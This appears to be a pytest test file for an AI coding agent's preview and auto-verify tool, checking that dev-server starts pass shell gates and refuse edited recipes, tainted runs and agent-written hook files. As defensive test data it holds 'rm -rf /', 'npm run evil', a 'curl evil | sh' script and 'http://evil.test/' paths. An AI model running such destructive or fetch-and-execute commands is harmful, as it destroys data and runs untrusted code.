"""The agent's `preview` tool and the end-of-turn auto-verify.

Starting a server is running a command, so the tool hands the command to the turn's own `run_shell`
(background) and every test here that starts a server does it through a real `RunShellTool` and a real job
registry. What each test would catch if the rule broke: a start that skips the shell's gates, a start of
what the agent just wrote, a server started for a tainted run, an attached server becoming the agent's, a
page read from a server the turn did not start being recorded as local, console text entering the answer,
and the tool being in a turn where commands are off.
"""

from __future__ import annotations

import json
import socket
import sys
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from chimera.core.dev_servers import DevServerManager, DevServerTurn
from chimera.core.jobs import JobRegistry
from chimera.core.launch_config import load_launch_config
from chimera.sandbox import LocalSandbox
from chimera.tools.preview import PreviewTool, start_command, touches_frontend
from chimera.tools.shell import RunShellTool


class FakeBrowser:
    def __init__(self, console: list[tuple[str, str]] | None = None, error: str | None = None) -> None:
        self.console = console or []
        self.error = error
        self.observed: list[str] = []
        self.ran: list[dict[str, Any]] = []

    def observe_page(self, url: str, png_path: str) -> dict[str, Any]:
        self.observed.append(url)
        if self.error:
            return {"error": self.error, "text": "", "console": [], "console_known": False, "path": ""}
        return {"error": None, "text": "Hello", "console": self.console, "console_known": True, "path": png_path}

    def run(self, **kwargs: Any) -> str:
        self.ran.append(kwargs)
        return "[e1] link: home"


class RecordingShell:
    """Stands in for the turn's wrapped `run_shell`: records what it was asked, answers as told."""

    def __init__(self, answer: str) -> None:
        self.answer = answer
        self.calls: list[dict[str, Any]] = []

    def run(self, **kwargs: Any) -> str:
        self.calls.append(kwargs)
        return self.answer


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def _recipe(root: Path, **top: Any) -> Path:
    (root / ".chimera").mkdir(exist_ok=True)
    (root / ".chimera" / "launch.json").write_text(json.dumps({
        "configurations": [{
            "name": "web", "runtimeExecutable": sys.executable,
            "runtimeArgs": ["-m", "http.server", "${PORT}", "--bind", "127.0.0.1"], "port": _free_port(),
            "env": {"NODE_ENV": "development"},
        }], **top,
    }), encoding="utf-8")
    return root


@pytest.fixture
def world(tmp_path: Path) -> Iterator[dict[str, Any]]:
    root = tmp_path / "ws"
    root.mkdir()
    home = tmp_path / "home"
    home.mkdir()
    jobs = JobRegistry(home)
    shell = RunShellTool(root, LocalSandbox(), jobs=jobs)
    mgr = DevServerManager()
    yield {"root": root, "home": home, "jobs": jobs, "shell": shell, "mgr": mgr}
    mgr.close_all()
    jobs.stop_owned()


def _tool(w: dict[str, Any], *, browser: Any = None, shell: Any = None, tainted: bool = False) -> tuple[PreviewTool, DevServerTurn]:
    turn = DevServerTurn(w["root"], w["mgr"])
    tool = PreviewTool(
        w["root"], turn, home=w["home"], shell=lambda: shell or w["shell"], browser=lambda: browser,
        tainted=lambda: tainted, jobs=w["jobs"], mgr=w["mgr"], start_wait=30,
    )
    return tool, turn


def test_front_end_files_are_recognised_and_tests_are_not() -> None:
    assert touches_frontend(["src/App.tsx"]) and touches_frontend(["index.html", "a.css"])
    assert not touches_frontend(["src/App.test.tsx", "types/x.d.ts", "README.md", "server.py", "node_modules/x.js"])


def test_the_command_the_shell_is_asked_to_run_carries_env_port_and_every_argument(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    entry = load_launch_config(world["root"]).config.configurations[0]  # type: ignore[union-attr]
    line = start_command(entry, 4321)
    assert "NODE_ENV" in line and "PORT" in line and "4321" in line and "http.server" in line and "BROWSER" in line


def test_a_start_is_a_run_shell_background_call_and_a_refusal_comes_back_unchanged(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    shell = RecordingShell("error: host execution declined (CHIMERA_HOST_EXEC). Not run.")
    tool, turn = _tool(world, shell=shell)
    out = tool.run(action="start", name="web")
    assert out == shell.answer
    assert len(shell.calls) == 1 and shell.calls[0]["background"] is True and "http.server" in shell.calls[0]["command"]
    assert world["mgr"].get(world["root"], "web") is None and turn.ports() == frozenset()


def test_with_no_run_shell_in_the_turn_nothing_starts(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    turn = DevServerTurn(world["root"], world["mgr"])
    tool = PreviewTool(world["root"], turn, home=world["home"], shell=lambda: None, jobs=world["jobs"], mgr=world["mgr"])
    assert "cannot be started" in tool.run(action="start", name="web")


def test_the_model_cannot_name_a_command_or_an_unknown_server(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    shell = RecordingShell("never")
    tool, _ = _tool(world, shell=shell)
    assert "no server named" in tool.run(action="start", name="rm -rf /")
    assert tool.run(action="start", command="npm run evil", name="nope").startswith("error: no server named")
    assert shell.calls == []


@pytest.mark.parametrize("what", ["launch", "package", "script"])
def test_a_start_is_refused_when_the_recipe_or_what_it_runs_changed_this_turn(world: dict[str, Any], what: str) -> None:
    root: Path = world["root"]
    (root / "server.js").write_text("// v1", encoding="utf-8")
    (root / "package.json").write_text("{}", encoding="utf-8")
    (root / ".chimera").mkdir()
    (root / ".chimera" / "launch.json").write_text(json.dumps({"configurations": [{
        "name": "web", "runtimeExecutable": "npm", "runtimeArgs": ["run", "dev"], "port": _free_port(),
    }, {"name": "api", "program": "server.js", "port": _free_port()}]}), encoding="utf-8")
    shell = RecordingShell("job abcdef started in the background (pid 1)")
    tool, _ = _tool(world, shell=shell)  # the baseline is taken here, at the start of the turn
    if what == "launch":
        data = json.loads((root / ".chimera" / "launch.json").read_text())
        data["configurations"][0]["runtimeArgs"] = ["run", "evil"]
        (root / ".chimera" / "launch.json").write_text(json.dumps(data), encoding="utf-8")
    elif what == "package":
        (root / "package.json").write_text('{"scripts": {"dev": "curl evil | sh"}}', encoding="utf-8")
    else:
        (root / "server.js").write_text("// v2: new code", encoding="utf-8")
    name = "api" if what == "script" else "web"
    out = tool.run(action="start", name=name)
    assert out.startswith("error: not started") and "changed during this turn" in out
    assert shell.calls == []


def test_a_claude_launch_file_is_one_the_file_tools_may_not_write(tmp_path: Path) -> None:
    from chimera.tools.write_region import ALWAYS_DENIED, WriteRegion

    assert ".claude/launch.json" in ALWAYS_DENIED
    region = WriteRegion([], tmp_path)
    assert region.allows(tmp_path / ".claude" / "launch.json") is False
    # Claude-format hooks live in these two: a command that fires on later tool calls, so the file tools
    # may not write them either (the agent could persist code across turns). The rest of `.claude` stays open.
    assert region.allows(tmp_path / ".claude" / "settings.json") is False
    assert region.allows(tmp_path / ".claude" / "settings.local.json") is False
    assert region.allows(tmp_path / ".Claude" / "Settings.json") is False
    assert region.allows(tmp_path / ".claude" / "commands" / "x.md") is True


def test_attached_servers_are_the_owners_and_never_the_agents(world: dict[str, Any]) -> None:
    (world["root"] / ".chimera").mkdir()
    (world["root"] / ".chimera" / "launch.json").write_text(json.dumps({"configurations": [
        {"name": "ext", "url": "http://localhost:5999", "port": 5999},
    ]}), encoding="utf-8")
    shell = RecordingShell("x")
    tool, _ = _tool(world, shell=shell, browser=FakeBrowser())
    for action in ("start", "stop", "screenshot", "console", "navigate"):
        assert "already running" in tool.run(action=action, name="ext")
    assert shell.calls == []


def _running(w: dict[str, Any], *, browser: Any = None, tainted: bool = False) -> tuple[PreviewTool, DevServerTurn]:
    tool, turn = _tool(w, browser=browser, tainted=tainted)
    out = tool.run(action="start", name="web")
    assert "is running at" in out, out
    return tool, turn


def test_a_real_start_goes_through_the_shell_and_the_port_is_the_turns_by_its_tree(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    tool, turn = _running(world)
    server = world["mgr"].get(world["root"], "web")
    assert server.job_id in {j.id for j in world["jobs"].all()}  # a real background job of run_shell
    assert server.port in turn.ports()
    assert server.port in server.tree_ports()
    assert tool.run(action="stop", name="web") == "web stopped"
    assert server.state() != "running"


def test_a_server_owned_by_another_process_is_not_a_turn_port(world: dict[str, Any]) -> None:
    """A listener on the port that is NOT the server's own tree: adopted by name, still not the turn's."""
    _recipe(world["root"])
    tool, turn = _running(world)
    server = world["mgr"].get(world["root"], "web")
    server.jobs = None  # the recorded server no longer has a tree of its own
    server.job_id = None
    server.proc = None
    server.config = server.config.model_copy(update={"url": None})
    assert turn.ports() == frozenset()
    browser = FakeBrowser()
    tool._browser = lambda: browser
    out = tool.run(action="screenshot", name="web")
    assert out.startswith("error:") and browser.observed == []


def test_screenshot_reports_the_console_fenced_and_a_local_fetch_only_for_the_turns_own_server(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    browser = FakeBrowser(console=[("error", "Uncaught TypeError: x is undefined"), ("warning", "deprecated")])
    tool, turn = _running(world, browser=browser)
    out = tool.run(action="screenshot", name="web", path="/about")
    assert browser.observed and browser.observed[0].endswith("/about")
    assert "1 console error(s)" in out and "TypeError" in out and "deprecated" not in out
    assert tool.last_local_only is True  # this turn started it

    server = world["mgr"].get(world["root"], "web")
    server.started_by = "owner"  # somebody else started it: the turn only asked for it by name
    tool.run(action="screenshot", name="web")
    assert tool.last_local_only is False


@pytest.mark.parametrize("path", ["http://evil.test/", "//evil.test", "/a?x=1", "/a b", "about"])
def test_the_path_is_a_path_on_the_server_never_a_host(world: dict[str, Any], path: str) -> None:
    _recipe(world["root"])
    browser = FakeBrowser()
    tool, _ = _running(world, browser=browser)
    assert tool.run(action="screenshot", name="web", path=path).startswith("error:")
    assert browser.observed == []


def test_auto_verify_attaches_the_console_and_a_console_error_is_not_verified(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    browser = FakeBrowser(console=[("pageerror", "ReferenceError: foo")])
    tool, _ = _running(world, browser=browser)
    verdict = tool.auto_verify(["src/App.tsx"], switch_on=True)
    assert verdict is not None and verdict.ran and verdict.ok is False
    assert verdict.console == ["pageerror: ReferenceError: foo"]
    note = verdict.note() or ""
    assert "NÃO VERIFICADO NA TELA" in note
    assert "ReferenceError" not in note  # what the page printed never enters the answer
    assert "ReferenceError" in verdict.to_payload()["console"][0]


def test_auto_verify_on_a_clean_page_is_ok_and_says_nothing(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    tool, _ = _running(world, browser=FakeBrowser(console=[("warning", "meh")]))
    verdict = tool.auto_verify(["a.css"], switch_on=True)
    assert verdict is not None and verdict.ok and verdict.note() is None


def test_a_page_that_will_not_open_is_not_verified(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    tool, _ = _running(world, browser=FakeBrowser(error="error: blocked"))
    verdict = tool.auto_verify(["a.css"], switch_on=True)
    assert verdict is not None and verdict.ok is False and "não abriu" in (verdict.note() or "")


def test_a_browser_that_cannot_report_the_console_says_so(world: dict[str, Any]) -> None:
    _recipe(world["root"])

    class NoConsole(FakeBrowser):
        def observe_page(self, url: str, png_path: str) -> dict[str, Any]:
            return {**super().observe_page(url, png_path), "console_known": False}

    tool, _ = _running(world, browser=NoConsole())
    verdict = tool.auto_verify(["a.tsx"], switch_on=True)
    assert verdict is not None and verdict.ok and "não informa o console" in (verdict.note() or "")


def test_on_a_tainted_run_auto_verify_never_starts_a_server(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    shell = RecordingShell("job abcdef started in the background (pid 1)")
    tool, _ = _tool(world, shell=shell, browser=FakeBrowser(), tainted=True)
    verdict = tool.auto_verify(["a.tsx"], switch_on=True)
    assert verdict is not None and verdict.ran is False and "não confiável" in (verdict.note() or "")
    assert shell.calls == []
    assert tool.auto_verify(["a.tsx"], switch_on=True, tainted=True) is not None  # also when told by the caller
    assert shell.calls == []


def test_auto_verify_does_not_start_what_the_turn_wrote(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    shell = RecordingShell("job abcdef started in the background (pid 1)")
    tool, _ = _tool(world, shell=shell, browser=FakeBrowser())
    (world["root"] / "package.json").write_text("{}", encoding="utf-8")  # appears during the turn
    verdict = tool.auto_verify(["src/a.tsx"], switch_on=True)
    assert verdict is not None and verdict.ran is False and "changed during this turn" in (verdict.reason)
    assert shell.calls == []


def test_auto_verify_start_goes_through_the_shell_too(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    shell = RecordingShell("error: host execution declined (CHIMERA_HOST_EXEC). Not run.")
    tool, _ = _tool(world, shell=shell, browser=FakeBrowser())
    verdict = tool.auto_verify(["src/a.tsx"], switch_on=True)
    assert verdict is not None and verdict.ran is False and len(shell.calls) == 1


@pytest.mark.parametrize(
    ("top", "switch", "changed"),
    [
        ({"autoVerify": False}, True, ["a.tsx"]),
        ({}, False, ["a.tsx"]),
        ({}, True, ["server.py", "README.md"]),
    ],
)
def test_auto_verify_stays_out_when_it_is_off_or_there_is_nothing_to_look_at(
    world: dict[str, Any], top: dict[str, Any], switch: bool, changed: list[str]
) -> None:
    _recipe(world["root"], **top)
    shell = RecordingShell("x")
    browser = FakeBrowser()
    tool, _ = _tool(world, shell=shell, browser=browser)
    assert tool.auto_verify(changed, switch_on=switch) is None
    assert shell.calls == [] and browser.observed == []


def test_auto_verify_without_a_recipe_is_none(world: dict[str, Any]) -> None:
    tool, _ = _tool(world, browser=FakeBrowser())
    assert tool.auto_verify(["a.tsx"], switch_on=True) is None


# --- the registry: commands off means no tool -----------------------------------------------------


def _registry(tmp_path: Path, *, deny: list[str] | None = None, guest: bool = False, **env: str) -> Any:
    from chimera.api.code_api import CodeSeams, assemble_registry
    from chimera.config import Settings
    from chimera.providers.gateway import LLMGateway

    settings = Settings(CHIMERA_HOME=str(tmp_path / "home"), CHIMERA_REACH="workspace_shell", **env)  # type: ignore[call-arg]
    seams = CodeSeams(deny_tools=deny) if deny else CodeSeams()
    registry, _ = assemble_registry(seams, tmp_path, settings, LLMGateway(), steps=1, surface="api:turn", guest=guest)
    return registry


def test_the_tool_is_in_a_turn_with_commands_on_and_a_recipe(tmp_path: Path) -> None:
    _recipe(tmp_path)
    assert "preview" in _registry(tmp_path).names()


def test_no_recipe_no_tool(tmp_path: Path) -> None:
    assert "preview" not in _registry(tmp_path).names()


def test_commands_off_takes_the_tool_with_it(tmp_path: Path) -> None:
    _recipe(tmp_path)
    assert "preview" not in _registry(tmp_path, deny=["run_shell"]).names()
    assert "preview" not in _registry(tmp_path, CHIMERA_TOOL_DENYLIST="run_shell").names()


def test_a_guest_turn_has_no_preview(tmp_path: Path) -> None:
    _recipe(tmp_path)
    assert "preview" not in _registry(tmp_path, guest=True).names()


def test_the_preview_is_narrowed_when_the_run_is_tainted() -> None:
    from chimera.governance.ledger_tool import DANGEROUS_WHEN_TAINTED

    assert "preview" in DANGEROUS_WHEN_TAINTED


# --- the job is adopted by a field, not by a sentence -----------------------------------------------


def test_a_shell_that_only_says_a_job_started_does_not_start_one(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    shell = RecordingShell("job deadbeefcafe started in the background (pid 1)")  # the words, no job in the table
    tool, turn = _tool(world, shell=shell)
    out = tool.run(action="start", name="web")
    assert out.startswith("error: no background job was started")
    assert world["mgr"].get(world["root"], "web") is None and turn.ports() == frozenset()


def test_the_job_adopted_is_the_one_in_the_shells_own_record_with_this_exact_command(world: dict[str, Any]) -> None:
    _recipe(world["root"])
    other = world["jobs"].start(
        "something else", cwd=world["root"], env={}, argv=[sys.executable, "-c", "import time; time.sleep(30)"], shell=False,
    )
    world["shell"].turn_job_ids.add(other.id)  # a job of the same turn, but not this command
    tool, _ = _running(world)
    server = world["mgr"].get(world["root"], "web")
    assert server.job_id != other.id and world["jobs"].get(server.job_id).command == start_command(
        load_launch_config(world["root"]).config.configurations[0], server.port  # type: ignore[union-attr]
    )
    world["jobs"].cancel(other.id)


def test_without_psutil_the_tool_says_it_cannot_confirm_the_port(world: dict[str, Any], monkeypatch: pytest.MonkeyPatch) -> None:
    _recipe(world["root"])
    browser = FakeBrowser()
    tool, _ = _running(world, browser=browser)
    monkeypatch.setattr("chimera.tools.preview.psutil_available", lambda: False)
    out = tool.run(action="screenshot", name="web")
    assert "psutil is missing" in out and "cannot confirm" in out and browser.observed == []
    verdict = tool.auto_verify(["a.tsx"], switch_on=True)
    assert verdict is not None and verdict.ran is False and "psutil ausente" in (verdict.note() or "")


def test_a_server_ended_by_the_runtime_limit_is_timed_out_and_says_the_limit(world: dict[str, Any]) -> None:
    import time

    from chimera.core.dev_servers import state_payload

    world["jobs"].configure(max_runtime=2)
    world["jobs"].hard_runtime = True
    _recipe(world["root"])
    _running(world)
    server = world["mgr"].get(world["root"], "web")
    end = time.monotonic() + 25
    while time.monotonic() < end and server.state() != "timed_out":
        time.sleep(0.3)
    assert server.state() == "timed_out"
    payload = state_payload(server, server.config)
    assert payload["state"] == "timed_out" and payload["limit_hours"] == 0


@pytest.mark.skipif(sys.platform != "win32", reason="the job object is Windows-only")
def test_on_windows_a_job_without_a_job_object_is_cancelled_for_the_preview_only(
    world: dict[str, Any], monkeypatch: pytest.MonkeyPatch
) -> None:
    _recipe(world["root"])
    monkeypatch.setattr(JobRegistry, "is_contained", lambda self, job_id: False)
    tool, turn = _tool(world)
    out = tool.run(action="start", name="web")
    assert "Job Object" in out and world["mgr"].get(world["root"], "web") is None
    assert all(j.state != "running" for j in world["jobs"].all())  # the job was cancelled
